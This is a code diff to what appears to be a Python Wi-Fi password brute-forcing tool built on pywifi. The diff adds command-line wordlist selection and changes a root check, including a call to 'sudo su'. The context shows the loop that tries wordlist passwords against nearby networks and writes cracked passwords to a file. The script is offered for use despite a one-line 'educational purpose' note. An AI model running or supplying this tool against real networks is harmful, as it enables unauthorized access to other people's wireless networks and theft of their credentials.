@@ -1,4 +1,6 @@
 import os
+import platform
+import sys
 try:
     import pywifi
 except ModuleNotFoundError:
@@ -9,12 +11,25 @@ from scripts.sprint import sprint
 from scripts.colors import ran,y,r,g,c
 
 import time
-import webbrowser
 
-# webbrowser.open("Head.html")
 
 yes = ["y" , "yes"]
 no = ["no" , "n"]
+
+def help():
+    print(f"\t{r}-> {c}Usage:~ {y}python3 wifi-brute.py <wordlist>\n\t{r}-> {c}python3 wifi-brute.py {y}(it wil use default wordlist")
+    exit()
+
+
+if len(sys.argv) < 2:
+    p_in = "passwords.txt"
+
+elif sys.argv[1] == "--help":
+    help()
+
+else:
+    p_in = sys.argv[1]
+
 
 def rootCHEK():
     s = os.popen("whoami").read()
@@ -23,8 +38,17 @@ def rootCHEK():
         print("You are root")
         pass
     else:
-        print("Run this tool as root")
-        exit()
+        if "aarch64" in platform.machine():
+            print("Run this tool as root in Termux.")
+            exit()
+        if "Linux" in platform.platform():
+            print("Root your terminal for better performance")
+            os.system("sudo su")
+        if "Windows" in platform.platform():
+            print("Iam developed to work on Windows. Dont worry i'll take care of next!")
+
+        time.sleep(3)
+
 rootCHEK()
 
 
@@ -32,23 +56,14 @@ clear()
 
 sprint(f"\n\n{r} Note: {c}This tool is only made for educational purpose... -_+")
 sprint(f"\n{g}Preparing...")
-time.sleep(1)
+time.sleep(2)
 clear()
 banner()
 
 
-p_in = input(f"{y}\nDo you want to use default wordlist? {r}(y/n):").lower()
 
-passlist = ""
 
-if p_in in yes:
-    passlist = f"passwords.txt"
-else:
-    try:
-        passlist = input(ran + "\nEnter path for passlist: " + g)
-    except FileNotFoundError:
-        print(r+"File Not found!")
-        exit(0)
+passlist = p_in
 
 
 passwords = [x.strip("\n") for x in open(passlist , "r", encoding="UTF-8" , errors="ignore").readlines()]
@@ -77,7 +92,7 @@ def main():
 
         if res:
             print(ran + "="*20)
-            print(f"{r}Password found : {c}{str(res)}")
+            print(f"{r}Password found : {c}{str(res)}\n")
 
             with open("avail_nearby_wifis.txt", "a") as f:
                 f.write(str(res) + "\n")
@@ -101,7 +116,7 @@ def test(i ,face,x,key,ts):
             continue
         else:
             with open("already_tried_password" , "a") as f:
-                f.write(str(wifi_name)+"--"+str(password))
+                f.write(str(wifi_name)+"--"+str(password)+"\n")
         tried.append(str(wifi_name)+"--"+str(password))
         print(f"{ran}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")
 
